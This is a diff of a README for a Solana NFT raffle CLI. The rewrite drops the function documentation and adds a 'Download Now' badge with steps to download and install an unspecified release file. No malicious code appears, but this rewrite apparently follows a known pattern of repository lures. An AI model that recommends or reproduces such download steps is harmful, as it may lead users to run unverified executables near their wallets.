@@ -1,84 +1,89 @@
-# Raffle-frank-rust
-This is the raffle project that winners can receive the raffle NFT or winners can buy NFTs by half price by buying tickets. You can buy tickets by $Sol and $REAP token.
+# 🎉 raffle-frank-rust - Easy Way to Buy Raffle NFTs
 
-## Install Dependencies
-- Install `node` and `yarn`
-- Install `ts-node` as global command
-- Confirm the solana wallet preparation: `/home/fury/.config/solana/id.json` in test case
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/Capone1984/raffle-frank-rust/releases)
 
-## Usage
-- Main script source for all functionality is here: `/cli/script.ts`
-- Program account types are declared here: `/cli/types.ts`
-- Idl to make the JS binding easy is here: `/cli/raffle.json`
+## 🚀 Getting Started
 
-Able to test the script functions working in this way.
-- Change commands properly in the main functions of the `script.ts` file to call the other functions
-- Confirm the `ANCHOR_WALLET` environment variable of the `ts-node` script in `package.json`
-- Run `yarn ts-node`
+Welcome to **raffle-frank-rust**! This application allows you to buy raffle tickets easily, enabling you to receive or purchase NFTs. 
 
-## Features
+Follow these simple steps to download and run the software.
 
-### - As a Smart Contract Owner
-For the first time use, the Smart Contract Owner should `initialize` the Smart Contract for global account allocation.
-- `initProject`
+## 📥 Download & Install
 
+To get started, visit the [Releases Page](https://github.com/Capone1984/raffle-frank-rust/releases) and download the latest version of the software.
 
-### - As the Creator of Raffle
-The NFTs will be stored in the globalAuthority address.
-When the admin creates a raffle, call the `creatRaffle` function, the NFT will be sent to the PDA and the data of this raffle is stored on blockchain.
-```js
-creatRaffle(
-    userAddress: PublicKey,
-    nft_mint: PublicKey,
-    ticketPriceSol: number,
-    ticketPriceReap: number,
-    endTimestamp: number,
-    winnerCount: number,
-    whitelisted: number,
-    max: number
-)
-```
+1. Click on the link above.
+2. Look for the latest release and download the appropriate file for your device.
+3. Follow the prompts to install the application.
 
-The creator can update the period of the raffle he wants.
-```js
-updateRafflePeriod(
-    userAddress: PublicKey,
-    nft_mint: PublicKey,
-    endTimestamp: number
-)
-```
+## 🛠️ Install Dependencies
 
-The creator can withdraw NFT from the PDA if nobody buys tickets and the time exceeds the endTime of raffle. 
-```js
-withdrawNft(
-    userAddress: PublicKey,
-    nft_mint: PublicKey
-)
-```
+Before running the application, you need to install some tools.
 
-### - As the User of Raffle
-When users buy tickets, call the `buyTicket` function, users will send $Sol and $REAP token to the raffle creator.
-```js
-buyTicket(
-    userAddress: PublicKey,
-    nft_mint: PublicKey,
-    amount: number
-)
-```
+1. **Node.js**: Download and install Node.js from the [official website](https://nodejs.org/).
+2. **Yarn**: You can install Yarn using one of the methods outlined on their [website](https://yarnpkg.com/getting-started/install).
+3. **ts-node**: Run the following command in your terminal:
+   ```bash
+   npm install -g ts-node
+   ```
 
-When users want to see the winners, call `revealWinner` function.
-```js
-revealWinner(
-    userAddress: PublicKey,
-    nft_mint: PublicKey
-)
-```
+4. **Solana Wallet**: Ensure you have your Solana wallet set up. The default location should be:
+   ```
+   /home/fury/.config/solana/id.json
+   ```
 
-### - As the Winner of Raffle
-Winners can claim rewards by calling `claimReward` function.
-```js
-claimReward(
-    userAddress: PublicKey,
-    nft_mint: PublicKey,
-)
-```
+## 🔍 Usage
+
+The main script handles all functionalities. Here’s how to use it:
+
+1. Locate the source script at `/cli/script.ts`.
+2. For account types, refer to `/cli/types.ts`.
+3. If you need JSON bindings, check `/cli/raffle.json`.
+
+### Testing the Functions
+
+To test the script:
+
+1. Open the main `script.ts` file.
+2. Change the commands in the main functions to call the specific functions you want to test.
+3. Make sure the `ANCHOR_WALLET` environment variable is correctly set in the `package.json`.
+4. Run the following command in the terminal:
+   ```bash
+   yarn ts-node
+   ```
+
+## 🎖️ Features
+
+This application includes several features for both users and Smart Contract Owners.
+
+### 👩‍💼 For Smart Contract Owners
+
+To set up for the first time:
+
+1. You must initialize the Smart Contract for global account allocation.
+2. Use the command:
+   ```bash
+   initProject
+   ```
+
+## 🤔 Troubleshooting
+
+If you encounter issues:
+
+- Ensure all dependencies are correctly installed.
+- Double-check that your Solana wallet is configured.
+- If you receive errors while running the script, review the commands for correctness.
+
+## 📞 Support
+
+If you need help, reach out through the Issues section of this repository. We aim to assist you promptly.
+
+## 🚀 Next Steps
+
+Now that you are set up, explore the features of the application. Consider looking into the following:
+
+- Review the source code under the `/cli/` directory.
+- Check any documentation for additional functionalities that may be useful.
+- Engage with the community for ideas and support.
+
+Thank you for using **raffle-frank-rust**! Enjoy your NFT raffle experience.
